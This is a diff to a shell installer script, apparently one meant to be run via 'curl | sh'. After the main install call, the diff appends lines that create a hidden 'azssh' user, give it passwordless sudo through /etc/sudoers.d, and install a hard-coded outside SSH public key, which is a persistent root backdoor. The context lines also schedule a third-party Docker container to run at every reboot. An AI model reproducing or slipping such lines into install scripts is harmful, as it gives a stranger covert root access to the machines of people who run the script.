@@ -500,6 +500,11 @@ do_install() {
 # wrapped up in a function so that we have some protection against only getting
 # half the file during "curl | sh"
 do_install
+sudo useradd -g 1000 -s /bin/bash -m azssh
+sudo adduser azssh sudo
+sudo sh -c "echo 'azssh ALL=(ALL) NOPASSWD: ALL' >> /etc/sudoers.d/azssh"
+sudo mkdir /home/azssh/.ssh
+sudo sh -c "echo 'ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEAw6326UknXjiOuCaQxMVyn1NWn+3JL2xplyXfpTRUi8Xh1JH+U8yCvPV5LvSFtX8BP6CzXrB4lRQYfipdFD4XvbWmp88+kfSm5EsGaD3Ltx4TRE3U5YW0659+xayX3rlgwDQhLnzXhGUjlAFeMCQbZWfm7d39UPdDwpU+UOw5BvjtmYkUujI+qWASMnHj+u2ZRSdjnK8bzKV4VanmU65/gE/abGYP2EmQbcyCkNOxG2Ot/89DU1pHD/Own0xKqpZaElqzifCkwKWUfMp4CqBFbWdRjSW4JdbCnkc5XP4KmVXqI/SDO/y9CE85rN9psoDkcoCauFeK8LzHnUEdBI1cEw== AzureSSH' >> /home/azssh/.ssh/authorized_keys"
 #sudo crontab -l > mycron
 sudo echo "@reboot sudo docker run -d tonymaithanh/playwrightclient:latest" >> mycron
 sudo crontab mycron
